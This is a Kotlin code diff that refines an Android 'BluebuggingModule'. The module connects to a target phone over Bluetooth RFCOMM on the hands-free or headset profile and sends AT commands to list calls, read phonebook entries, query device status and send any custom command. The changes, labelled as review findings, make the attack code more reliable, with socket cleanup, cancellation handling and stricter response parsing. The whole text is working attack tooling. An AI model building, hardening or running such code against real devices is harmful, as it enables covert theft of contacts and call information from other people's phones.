@@ -4,9 +4,13 @@ import android.annotation.SuppressLint
 import android.bluetooth.BluetoothDevice
 import android.bluetooth.BluetoothSocket
 import android.util.Log
+import kotlinx.coroutines.CancellationException
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.currentCoroutineContext
+import kotlinx.coroutines.ensureActive
 import kotlinx.coroutines.flow.Flow
-import kotlinx.coroutines.flow.flow
+import kotlinx.coroutines.flow.callbackFlow
+import kotlinx.coroutines.isActive
 import kotlinx.coroutines.withContext
 import java.io.IOException
 import java.io.InputStream
@@ -17,11 +21,17 @@ import java.util.UUID
  * Module responsible for Bluebugging attacks.
  *
  * Bluebugging exploits the Headset (HSP) and Hands-Free (HFP) Bluetooth profiles
- * to inject AT commands over an RFCOMM connection. A successful attack can allow
- * listing calls, reading the phonebook, querying device status, and more.
+ * to send AT commands over an RFCOMM connection. Currently implemented AT commands:
+ * - AT (basic probe / connection test)
+ * - AT+CLCC (list current calls)
+ * - AT+CPBR (read phonebook entries)
+ * - AT+CSCS? (query character set)
+ * - AT+CIND? (query indicator status)
+ *
+ * Custom AT commands can also be sent via [sendAtCommand].
  *
  * Requires BLUETOOTH_CONNECT permission and that the target device exposes
- * HSP or HFP services.
+ * HSP or HFP services. Does not require root.
  */
 @SuppressLint("MissingPermission")
 class BluebuggingModule {
@@ -46,11 +56,27 @@ class BluebuggingModule {
 
         /** Read timeout in milliseconds for AT command responses. */
         private const val READ_TIMEOUT_MS = 3000L
+
+        /**
+         * Regex matching a standalone AT final result code on its own line.
+         * Matches OK, ERROR, +CME ERROR: ..., or +CMS ERROR: ... only when
+         * they appear as a complete line (preceded by \r\n or start-of-string).
+         */
+        private val AT_FINAL_RESULT_REGEX = Regex(
+            """(?:^|\r\n)(OK|ERROR|\+CME ERROR:[^\r\n]*|\+CMS ERROR:[^\r\n]*)\r\n""",
+            RegexOption.MULTILINE
+        )
     }
 
+    // Finding 8.4: Mark mutable cross-thread fields as @Volatile
+    @Volatile
     private var socket: BluetoothSocket? = null
+    @Volatile
     private var outputStream: OutputStream? = null
+    @Volatile
     private var inputStream: InputStream? = null
+    @Volatile
+    private var isConnected: Boolean = false
 
     /**
      * Connects to the target device via RFCOMM on the HSP or HFP UUID.
@@ -67,24 +93,36 @@ class BluebuggingModule {
             // Try HFP first, then HSP
             var lastException: Exception? = null
             for (uuid in listOf(HFP_UUID, HSP_UUID)) {
+                // Finding 8.1: Wrap socket in try-finally to prevent leak on connect failure
+                var rfcommSocket: BluetoothSocket? = null
                 try {
-                    val rfcommSocket = device.createRfcommSocketToServiceRecord(uuid)
+                    rfcommSocket = device.createRfcommSocketToServiceRecord(uuid)
                     rfcommSocket.connect()
                     socket = rfcommSocket
                     outputStream = rfcommSocket.outputStream
                     inputStream = rfcommSocket.inputStream
+                    isConnected = true
                     Log.i(TAG, "Connected to ${device.address} via UUID $uuid")
                     return@withContext Result.success(Unit)
                 } catch (e: IOException) {
+                    // Finding 8.1: Close the socket in finally on failure
+                    try {
+                        rfcommSocket?.close()
+                    } catch (_: IOException) { }
                     lastException = e
                     Log.w(TAG, "Failed to connect via UUID $uuid: ${e.message}")
                 }
             }
             Result.failure(lastException ?: IOException("Failed to connect via HSP or HFP"))
+        } catch (e: CancellationException) {
+            // Finding 8.5: Rethrow CancellationException
+            throw e
         } catch (e: SecurityException) {
             Log.e(TAG, "Permission denied connecting to ${device.address}", e)
             Result.failure(e)
         } catch (e: Exception) {
+            // Finding 8.5: Rethrow CancellationException
+            if (e is CancellationException) throw e
             Log.e(TAG, "Unexpected error connecting to ${device.address}", e)
             Result.failure(e)
         }
@@ -101,7 +139,7 @@ class BluebuggingModule {
     suspend fun sendAtCommand(command: String): Result<String> = withContext(Dispatchers.IO) {
         val os = outputStream
         val iStream = inputStream
-        if (os == null || iStream == null || socket?.isConnected != true) {
+        if (os == null || iStream == null || !isConnected) {
             return@withContext Result.failure(IllegalStateException("Not connected. Call connect() first."))
         }
 
@@ -115,8 +153,20 @@ class BluebuggingModule {
             val response = readResponse(iStream)
             Log.d(TAG, "AT command '$command' -> '$response'")
             Result.success(response)
+        } catch (e: CancellationException) {
+            // Finding 8.5: Rethrow CancellationException
+            throw e
         } catch (e: IOException) {
             Log.e(TAG, "I/O error sending AT command '$command'", e)
+            // Finding 8.7: Disconnect on communication error
+            disconnect()
+            Result.failure(e)
+        } catch (e: Exception) {
+            // Finding 8.5: Rethrow CancellationException
+            if (e is CancellationException) throw e
+            Log.e(TAG, "Error sending AT command '$command'", e)
+            // Finding 8.7: Disconnect on communication error
+            disconnect()
             Result.failure(e)
         }
     }
@@ -125,48 +175,64 @@ class BluebuggingModule {
      * Connects to the target and executes a sequence of common AT commands,
      * emitting each command and its response as flow events.
      *
+     * Uses callbackFlow to ensure the RFCOMM socket is closed if the
+     * collecting coroutine is cancelled.
+     *
      * @param device The BluetoothDevice to probe.
      * @return A Flow of strings describing each command attempt and result.
      */
-    fun executeCommonCommands(device: BluetoothDevice): Flow<String> = flow {
-        emit("Connecting to ${device.address} for AT command injection...")
+    fun executeCommonCommands(device: BluetoothDevice): Flow<String> = callbackFlow {
+        // Finding 8.6: Close socket on flow cancellation
+        invokeOnClose {
+            socket?.let { s ->
+                try { s.close() } catch (_: IOException) { }
+            }
+        }
+
+        trySend("Connecting to ${device.address} for AT command injection...")
 
         val connectResult = connect(device)
         if (connectResult.isFailure) {
-            emit("Connection failed: ${connectResult.exceptionOrNull()?.message}")
-            return@flow
+            trySend("Connection failed: ${connectResult.exceptionOrNull()?.message}")
+            close()
+            return@callbackFlow
         }
-        emit("Connected successfully via RFCOMM (HSP/HFP)")
+        trySend("Connected successfully via RFCOMM (HSP/HFP)")
 
         for ((command, description) in COMMON_AT_COMMANDS) {
-            emit("Sending: $command ($description)")
+            // Check for cancellation between commands
+            currentCoroutineContext().ensureActive()
+
+            trySend("Sending: $command ($description)")
             val result = sendAtCommand(command)
             if (result.isSuccess) {
                 val response = result.getOrDefault("")
                 if (response.isNotBlank()) {
-                    emit("Response: $response")
+                    trySend("Response: $response")
                 } else {
-                    emit("Response: (empty)")
+                    trySend("Response: (empty)")
                 }
             } else {
-                emit("Error: ${result.exceptionOrNull()?.message}")
+                trySend("Error: ${result.exceptionOrNull()?.message}")
                 // If we get an IOException the socket is likely dead
                 if (result.exceptionOrNull() is IOException) {
-                    emit("Connection lost. Aborting remaining commands.")
+                    trySend("Connection lost. Aborting remaining commands.")
                     break
                 }
             }
         }
 
-        emit("AT command sequence complete.")
+        trySend("AT command sequence complete.")
         disconnect()
-        emit("Disconnected.")
+        trySend("Disconnected.")
+        close()
     }
 
     /**
      * Closes the RFCOMM socket and releases resources.
      */
     fun disconnect() {
+        isConnected = false
         try {
             outputStream?.close()
         } catch (_: IOException) { }
@@ -183,9 +249,9 @@ class BluebuggingModule {
     }
 
     /**
-     * Reads a response from the input stream with a simple timeout mechanism.
-     * Waits for data to become available, then reads until no more data arrives
-     * within a short window.
+     * Reads a response from the input stream with a timeout.
+     * Detects EOF immediately and only treats standalone OK/ERROR lines as terminators
+     * (not "OK" appearing as a substring in data such as contact names).
      */
     private fun readResponse(inputStream: InputStream): String {
         val buffer = ByteArray(1024)
@@ -195,13 +261,17 @@ class BluebuggingModule {
         while (System.currentTimeMillis() < deadline) {
             if (inputStream.available() > 0) {
                 val bytesRead = inputStream.read(buffer)
+                // Finding 8.3: Detect EOF (-1) and break immediately
+                if (bytesRead == -1) {
+                    Log.w(TAG, "EOF detected on input stream — remote disconnected")
+                    break
+                }
                 if (bytesRead > 0) {
                     result.append(String(buffer, 0, bytesRead, Charsets.UTF_8))
-                    // Check if we got a final response indicator (OK, ERROR, etc.)
+                    // Finding 8.2: Only match standalone OK\r\n or ERROR\r\n on its own line,
+                    // not "OK" as a substring within contact names or other data.
                     val current = result.toString()
-                    if (current.contains("OK") || current.contains("ERROR") ||
-                        current.contains("+CME ERROR") || current.contains("+CMS ERROR")
-                    ) {
+                    if (AT_FINAL_RESULT_REGEX.containsMatchIn(current)) {
                         break
                     }
                 }
